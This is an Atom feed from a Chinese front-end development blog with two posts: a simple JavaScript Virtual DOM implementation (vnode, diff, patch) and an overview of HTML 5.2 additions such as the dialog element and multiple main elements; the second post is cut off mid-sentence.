<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>hanx の 碎片栈</title>
  
  <subtitle>Time waits for no one</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-01-16T16:22:25.735Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>hanx</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Virtual DOM的简单实现</title>
    <link href="http://yoursite.com/2018/01/16/Virtual%20DOM%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/"/>
    <id>http://yoursite.com/2018/01/16/Virtual DOM的简单实现/</id>
    <published>2018-01-16T15:16:06.000Z</published>
    <updated>2018-01-16T16:22:25.735Z</updated>
    
    <content type="html"><![CDATA[<p>之前在看vue的源码时了解了vue关于Virtual DOM的一些想法,Virtual DOM可以帮助我们更高效的操作DOM。它通过实现一个vnode的js对象，vnode的对象与dom的node对象是一一对应的，通过我们对vnode的操作可以实现对dom的操作，这样就可以避免频繁的dom操作带来的效率问题。vue的Virtual DOM实现了一套高效的diff算法来快速的比对更新dom树。</p><h4 id="VNode"><a href="#VNode" class="headerlink" title="VNode"></a>VNode</h4><p>首先，创建vnode的对象，vnode记录相应的DOM对象的一些属性。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">VNode</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">constructor</span> (tag, nodeType,key, props, text, children)&#123;</div><div class="line">        <span class="keyword">this</span>.tag = tag <span class="comment">//element类型</span></div><div class="line">        <span class="keyword">this</span>.nodeType = nodeType <span class="comment">//node类型，1为普通节点，3为文本节点，8为注释</span></div><div class="line">        <span class="keyword">this</span>.key = key</div><div class="line">        <span class="keyword">this</span>.props = props <span class="comment">//node的属性</span></div><div class="line">        <span class="keyword">this</span>.text = text <span class="comment">//文本节点的内容</span></div><div class="line">        <span class="keyword">this</span>.children = children<span class="comment">//子节点</span></div><div class="line">    &#125;</div><div class="line">    <span class="comment">//将vnode渲染成DOM节点的方法</span></div><div class="line">    render()&#123;</div><div class="line">        <span class="keyword">var</span> el</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.nodeType===<span class="number">1</span>)&#123;</div><div class="line">            el = <span class="built_in">document</span>.createElement(<span class="keyword">this</span>.tag)</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> prop <span class="keyword">in</span> <span class="keyword">this</span>.props)&#123;</div><div class="line">                setAttr(el,prop,<span class="keyword">this</span>.props[prop])</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>.children)&#123;</div><div class="line">                <span class="keyword">this</span>.children.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">ch,i</span>)</span>&#123;</div><div class="line">                    el.appendChild(ch.render())</div><div class="line">                &#125;)</div><div class="line"></div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.nodeType===<span class="number">3</span>)&#123;</div><div class="line">            el = <span class="built_in">document</span>.createTextNode(<span class="keyword">this</span>.text)</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.nodeType===<span class="number">8</span>)&#123;</div><div class="line">            el = <span class="built_in">document</span>.createComment(<span class="keyword">this</span>.text)</div><div class="line">        &#125;</div><div class="line">        el.key = <span class="keyword">this</span>.key</div><div class="line">        <span class="keyword">return</span> el</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">setAttr</span>(<span class="params">node,key,value</span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(key===<span class="string">'style'</span>)&#123;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> val <span class="keyword">in</span> value)&#123;</div><div class="line">            node.style[val] = value[val]</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        node.setAttribute(key,value)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h4 id="Diff"><a href="#Diff" class="headerlink" title="Diff"></a>Diff</h4><p>diff主要是用来对比新旧vnode的区别，找出区别的元素并记录在directives对象上，便于接下来可以通过directives的内容对旧的vnode进行替换，绘制新的DOM.</p><p>这是diff的入口方法，参数是旧的vnode和新的vnode,directives是用来记录每个节点的改变情况的对象。<br><figure class="highlight plain"><figcaption><span>javascript</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">export default function diff(oldVNode, newVNode)&#123;</div><div class="line">    directives = &#123;&#125;</div><div class="line">    diffVNode(oldVNode,newVNode,directives)</div><div class="line">    return directives</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>我们在diff方法中调用diffVNode来对节点进行逐一比较。首先，它会比较oldVNode和newVNode是否是相同的节点。如果相同，就对节点类型进行判断，来选择比较的方法，对于文本和注释节点，只需要比较文本内容是否相同即可，对于元素则要比较元素标签，元素的属性以及子元素是否相同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">function diffVNode(oldVNode,newVNode)&#123;</div><div class="line"></div><div class="line">    if(newVNode &amp;&amp; isSameTypeNode(oldVNode,newVNode))&#123;</div><div class="line">        if(newVNode.nodeType===3 || newVNode.nodeType===8)&#123;</div><div class="line">            if(oldVNode.text !== newVNode.text)&#123;</div><div class="line">                addDirectives(newVNode.key,&#123;type:TEXT, content: newVNode.text&#125;)</div><div class="line">            &#125;</div><div class="line">        &#125; else if(newVNode.nodeType===1)&#123;</div><div class="line">            if(oldVNode.tag === newVNode.tag &amp;&amp; oldVNode.key == newVNode.key)&#123;</div><div class="line">                var propPatches = diffProps(oldVNode.props, newVNode.props)</div><div class="line">                if(Object.keys(propPatches).length&gt;0)&#123;</div><div class="line">                    addDirectives(newVNode.key,&#123;type:PROP, content: propPatches&#125;)</div><div class="line">                &#125;</div><div class="line">                if(oldVNode.children || newVNode.children)</div><div class="line">                    diffChildren(oldVNode.children,newVNode.children,newVNode.key)</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    return directives</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这是比较节点属性的方法，对于有变化的属性我们将变化的部分记在patches这个数组里。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">diffProps</span>(<span class="params">oldProps,newProps</span>)</span>&#123;</div><div class="line">    <span class="keyword">let</span> patches=&#123;&#125;</div><div class="line">    <span class="keyword">if</span>(oldProps)&#123;</div><div class="line">        <span class="built_in">Object</span>.keys(oldProps).forEach(<span class="function">(<span class="params">prop</span>)=&gt;</span>&#123;</div><div class="line">            <span class="keyword">if</span>(prop === <span class="string">'style'</span> &amp;&amp; newProps[prop])&#123;</div><div class="line">                <span class="keyword">let</span> newStyle = newProps[prop]</div><div class="line">                <span class="keyword">let</span> isSame = <span class="literal">true</span></div><div class="line">                <span class="built_in">Object</span>.keys(oldProps[prop]).forEach(<span class="function">(<span class="params">item</span>)=&gt;</span>&#123;</div><div class="line">                    <span class="keyword">if</span>(prop[item] !== newStyle[item])&#123;</div><div class="line">                        isSame = <span class="literal">false</span></div><div class="line">                    &#125;</div><div class="line">                &#125;)</div><div class="line">                <span class="keyword">if</span>(isSame)&#123;</div><div class="line">                    <span class="built_in">Object</span>.keys(newStyle).forEach(<span class="function">(<span class="params">item</span>)=&gt;</span>&#123;</div><div class="line">                        <span class="keyword">if</span>(!prop.hasOwnProperty(item))&#123;</div><div class="line">                            isSame = <span class="literal">false</span></div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span>(!isSame)</div><div class="line">                    patches[prop] = newProps[prop]</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(newProps[prop] !== oldProps[prop])&#123;</div><div class="line">                patches[prop] = newProps[prop]</div><div class="line">            &#125;</div><div class="line">        &#125;)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(newProps)&#123;</div><div class="line">       <span class="built_in">Object</span>.keys(newProps).forEach(<span class="function">(<span class="params">prop</span>)=&gt;</span>&#123;</div><div class="line">        <span class="keyword">if</span>(!oldProps.hasOwnProperty(prop))&#123;</div><div class="line">            patches[prop] = newProps[prop]</div><div class="line">        &#125;</div><div class="line">    &#125;)</div><div class="line">   &#125;</div><div class="line">   </div><div class="line">    <span class="keyword">return</span> patches</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>下面是比较子节点的方法，子节点的更新分为增加子节点，删除子节点和移动子节点三种操作。对于子节点的操作将被记录在父节点的directives上。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">diffChildren</span>(<span class="params">oldChildren,newChildren,parentKey</span>)</span>&#123;</div><div class="line">    oldChildren = oldChildren || []</div><div class="line">    newChildren = newChildren || []</div><div class="line">    <span class="keyword">let</span> movedItem = []</div><div class="line">    <span class="keyword">let</span> oldKeyIndexObject = parseNodeList(oldChildren)</div><div class="line">    <span class="keyword">let</span> newKeyIndexObject = parseNodeList(newChildren)</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> newKeyIndexObject)&#123;</div><div class="line">        <span class="keyword">if</span>(!oldKeyIndexObject.hasOwnProperty(key))&#123;</div><div class="line">            addDirectives(parentKey,&#123;<span class="attr">type</span>:INSERT,<span class="attr">index</span>:newKeyIndexObject[key],<span class="attr">node</span>:newChildren[newKeyIndexObject[key]]&#125;)</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> oldKeyIndexObject)&#123;</div><div class="line">        <span class="keyword">if</span>(newKeyIndexObject.hasOwnProperty(key))&#123;</div><div class="line">            <span class="keyword">if</span>(oldKeyIndexObject[key] !== newKeyIndexObject[key])&#123;</div><div class="line">                <span class="keyword">let</span> moveObj = &#123;<span class="string">'oldIndex'</span>:oldKeyIndexObject[key],<span class="string">'newIndex'</span>:newKeyIndexObject[key]&#125;</div><div class="line">                movedItem[newKeyIndexObject[key]] = oldKeyIndexObject[key]</div><div class="line">            &#125;</div><div class="line">            diffVNode(oldChildren[oldKeyIndexObject[key]],newChildren[newKeyIndexObject[key]])</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            addDirectives(key,&#123;<span class="attr">type</span>:REMOVE,<span class="attr">index</span>:oldKeyIndexObject[key]&#125;)</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(movedItem.length&gt;<span class="number">0</span>)&#123;</div><div class="line">        addDirectives(parentKey,&#123;<span class="attr">type</span>:MOVE, <span class="attr">moved</span>:movedItem&#125;)</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>在经过Diff方法后，我们将得到我们传入的oldNode与newNode的比较结果，并记录在Directives对象中。</p><h4 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h4><p>Patch主要做的是通过我们之前的比较得到的Directives对象来修改Dom树。在Patch方法中如果该节点涉及到更新，将会调用applyPatch方法。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">patch</span>(<span class="params">node,directives</span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(node)&#123;</div><div class="line">        <span class="keyword">var</span> orderList = []</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> child <span class="keyword">of</span> node.childNodes)&#123;</div><div class="line"></div><div class="line">            patch(child,directives)</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(directives[node.key])&#123;</div><div class="line">            applyPatch(node,directives[node.key])</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>applyPatch方法主要对具体的Dom节点进行修改。根据directives的不同类型，调用不同的方法进行更新。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">applyPatch</span>(<span class="params">node, directives</span>)</span>&#123;</div><div class="line">    </div><div class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> directive <span class="keyword">of</span> directives)&#123;</div><div class="line">        <span class="keyword">switch</span> (directive.type)&#123;</div><div class="line">            <span class="keyword">case</span> TEXT:</div><div class="line">                setContent(node,directive.content)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">case</span> PROP:</div><div class="line">                setProps(node,directive.content)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">case</span> REMOVE:</div><div class="line">                removeNode(node)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">case</span> INSERT:</div><div class="line">                insertNode(node,directive.node,directive.index)</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>具体的更新方法是通过js来操作DOM节点进行操作。</p><p>推荐一个找vue,angular组件的 <a href="http://www.wheelsfactory.cn/#/" target="_blank" rel="external">轮子工厂</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前在看vue的源码时了解了vue关于Virtual DOM的一些想法,Virtual DOM可以帮助我们更高效的操作DOM。它通过实现一个vnode的js对象，vnode的对象与dom的node对象是一一对应的，通过我们对vnode的操作可以实现对dom的操作，这样就可以
      
    
    </summary>
    
      <category term="前端" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="nodejs" scheme="http://yoursite.com/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>HTML 5.2 有哪些新内容？</title>
    <link href="http://yoursite.com/2018/01/16/HTML%205.2%20%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B0%E5%86%85%E5%AE%B9%EF%BC%9F/"/>
    <id>http://yoursite.com/2018/01/16/HTML 5.2 有哪些新内容？/</id>
    <published>2018-01-16T12:38:11.000Z</published>
    <updated>2018-01-16T16:38:33.232Z</updated>
    
    <content type="html"><![CDATA[<p>就在不到一个月前，HTML 5.2 正式成为了 W3C 的推荐标准（REC）。当一个规范到达 REC 阶段，就意味着它已经正式得到了 W3C 成员和理事长的认可。并且 W3C 将正式推荐浏览器厂商部署、web 开发者实现此规范。</p><p>在 REC 阶段有个原则叫做“任何新事物都至少要有两种独立的实现”，这对于我们 web 开发者来说是一个实践新特性的绝佳机会。</p><p>在 HTML 5.2 中有一些添加和删除，具体改变可以参考官方的 HTML 5.2 变动内容网页。本文将介绍一些我认为与我的开发有关的改动。</p><h4 id="原生的dialog元素"><a href="#原生的dialog元素" class="headerlink" title="原生的dialog元素"></a>原生的dialog元素</h4><p>在 HTML 5.2 的所有改动中，最让我激动的就是关于dialog元素这个原生对话框的介绍。在 web 中，对话框比比皆是，但是它们的实现方式都各有不同。对话框很难实现可访问性，这导致大多数的对话框对那些不方便以视觉方式访问网页的用户来说都是不可用的。<br>新的dialog元素旨在改变这种状况，它提供了一种简单的方式来实现模态对话框。之后我会单独写一篇文章专门介绍这个元素的工作方式，在此先简单介绍一下。<br>由一个dialog&gt; 元素创建对话框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">dialog</span>&gt;</span>  </div><div class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Dialog Title<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Dialog content and other stuff will go here<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dialog</span>&gt;</span></div></pre></td></tr></table></figure><p>默认情况下，对话框会在视图中（以及 DOM 访问中）隐藏，只有设置 open 属性后，对话框才会显示。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">dialog</span> <span class="attr">open</span>&gt;</span></div></pre></td></tr></table></figure></p><p>open 属性可以通过调用 show() 与 close() 方法开启或关闭，任何 HTMLDialogElement 都可以调用这两个方法。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"open"</span>&gt;</span>Open Dialog<span class="tag">&lt;/<span class="name">button</span>&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"close"</span>&gt;</span>Close Dialog<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">dialog</span> <span class="attr">id</span>=<span class="string">"dialog"</span>&gt;</span>  </div><div class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Dialog Title<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Dialog content and other stuff will go here<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dialog</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">  </span></div><div class="line"><span class="javascript"><span class="keyword">const</span> dialog = <span class="built_in">document</span>.getElementById(<span class="string">"dialog"</span>);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"open"</span>).addEventListener(<span class="string">"click"</span>, () =&gt; &#123;  </span></div><div class="line"><span class="undefined">  dialog.show();</span></div><div class="line"><span class="undefined">&#125;);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"close"</span>).addEventListener(<span class="string">"click"</span>, () =&gt; &#123;  </span></div><div class="line"><span class="undefined">  dialog.close();</span></div><div class="line"><span class="undefined">&#125;);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure><p>目前，Chrome 浏览器已经支持dialog元素，Firefox 也即将支持（behind a flag）。<br><img src="https://user-gold-cdn.xitu.io/2018/1/16/160fde4350f53d00?imageView2/0/w/1280/h/960/ignore-error/1" alt="这里写图片描述"><br>上图为 caniuse.com 关于 dialog 特性主流浏览器兼容情况的数据</p><h4 id="在iFrame-中使用-Payment-Request-API（支付请求-API）"><a href="#在iFrame-中使用-Payment-Request-API（支付请求-API）" class="headerlink" title="在iFrame 中使用 Payment Request API（支付请求 API）"></a>在iFrame 中使用 Payment Request API（支付请求 API）</h4><p>Payment Request API 是支付结算表单的原生替代方案。它将支付信息置于浏览器处理，用来代替之前各个网站各不相同的结算表单，旨在为用户提供一种标准、一致的支付方式。<br>在 HTML 5.2 之前，这种支付请求无法在文档嵌入的 iframe 中使用，导致第三方嵌入式支付解决方案（如 Stripe, Paystack）基本不可能使用这个 API，因为它们通常是在 iframe 中处理支付接口。<br>为此，HTML 5.2 引入了用于 iframe 的 allowpaymentrequest 属性，允许用户在宿主网页中访问 iframe 的 Payment Request API。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">allowpaymentrequest</span>&gt;</span></div></pre></td></tr></table></figure><h4 id="苹果的图标尺寸"><a href="#苹果的图标尺寸" class="headerlink" title="苹果的图标尺寸"></a>苹果的图标尺寸</h4><p>如要定义网页图标，我们可以在文档的 head 中使用link rel=”icon”元素。如果要定义不同尺寸的图标，我们可以使用 sizes 属性。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">sizes</span>=<span class="string">"16x16"</span> <span class="attr">href</span>=<span class="string">"path/to/icon16.png"</span>&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">sizes</span>=<span class="string">"32x32"</span> <span class="attr">href</span>=<span class="string">"path/to/icon32.png"</span>&gt;</span></div></pre></td></tr></table></figure></p><p>这个属性虽然纯粹是个建议，但如果提供了多种尺寸的图标，可以让用户代理（UA）决定使用哪种尺寸的图标。在大多数设备有着不同的“最佳”图标尺寸时尤为重要。<br>在 HTML 5.2 之前，sizes 属性仅能用于 rel 为 icon 的 link 元素中。然而，苹果的 iOS 设备不支持 sizes 属性。为了解决这个问题，苹果自己引入了一个他们设备专用的 rel appple-touch-icon 用于定义他们设备上使用的图标。<br>在 HTML 5.2 中，规范定义了 sizes 属性不再仅仅可用于 rel 为 icon 的元素，也能用于 rel 为 apple-touch-icon 的元素。这样可以让我们为不同的苹果设备提供不同尺寸的图标。不过直到现在为止，据我所知苹果的设备还是不支持 sizes 属性。在将来苹果最终支持此规范时，它将派上用场。</p><h4 id="多个main元素"><a href="#多个main元素" class="headerlink" title="多个main元素"></a>多个main元素</h4><p>main元素代表网页的主要内容。虽然不同网页的重复内容可以放在 header、section 或者其它元素中，但main元素是为页面上的特定内容保留的。因此在 HTML 5.2 之前，main元素在 DOM 中必须唯一才能令页面有效。<br>随着单页面应用（SPA）的普及，要坚持这个原则变得困难起来。在同一个网页的 DOM 中可能会有多个main 元素，但在任意时刻只能给用户展示其中的一个。<br>使用 HTML 5.2，我们只要保证同一时刻只有一个main元素可见，就能在我们的标签中使用多个main元素。与此同时其它的main元素必须使用 hidden 属性进行隐藏。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">main</span>&gt;</span>...<span class="tag">&lt;/<span class="name">main</span>&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">main</span> <span class="attr">hidden</span>&gt;</span>...<span class="tag">&lt;/<span class="name">main</span>&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">main</span> <span class="attr">hidden</span>&gt;</span>...<span class="tag">&lt;/<span class="name">main</span>&gt;</span></div></pre></td></tr></table></figure><p>我们都知道，通过 CSS 来隐藏元素的方法有很多，但多余的main元素必须使用 hidden 属性进行隐藏。任何其它隐藏此元素的方法（如 display: none; 和 visibility: hidden;）都将无效。</p><h4 id="在body中写样式"><a href="#在body中写样式" class="headerlink" title="在body中写样式"></a>在body中写样式</h4><p>一般来说，使用style元素定义的内联 CSS 样式会放置在 HTML 文档的head中。随着组件化开发的流行，开发者已经发现编写 style 并放置在与其相关的 html 中更加有益。<br>在 HTML 5.2 中，可以在 HTML 文档body内的任何地方定义内联style样式块。这意味着样式定义可以离它们被使用的地方更近。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>I’m cornflowerblue!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="css">        <span class="selector-tag">p</span> &#123; <span class="attribute">color</span>: cornflowerblue; &#125;</span></div><div class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>I’m cornflowerblue!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure></p><p>然而仍需注意的是，由于性能问题，样式还是应当优先考虑放在head中。参见 规范，</p><p>样式元素最好用于文档的 head 中。在文档的 body 中使用样式可能导致重复定义样式，触发重布局、导致重绘，因此需要小心使用。</p><p>此外还应该注意的是如示例所示，样式不存在作用域。后来在 HTML 文档中定义的内联样式仍然会应用于之前定义的元素，所以它可能会触发重绘。</p><h4 id="legend中的标题元素"><a href="#legend中的标题元素" class="headerlink" title="legend中的标题元素"></a>legend中的标题元素</h4><p>在表单中，legend元素表示fieldset表单域中的标题。在 HTML 5.2 前，legend 元素的内容必须为纯文本。而现在，它可以包含标题元素（h1等）了。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>  </div><div class="line">    <span class="tag">&lt;<span class="name">legend</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Basic Information<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">legend</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- Form fields for basic information --&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>  </div><div class="line">    <span class="tag">&lt;<span class="name">legend</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Contact Information<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">legend</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- Form fields for contact information --&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></div></pre></td></tr></table></figure></p><p>当我们想用 fieldset 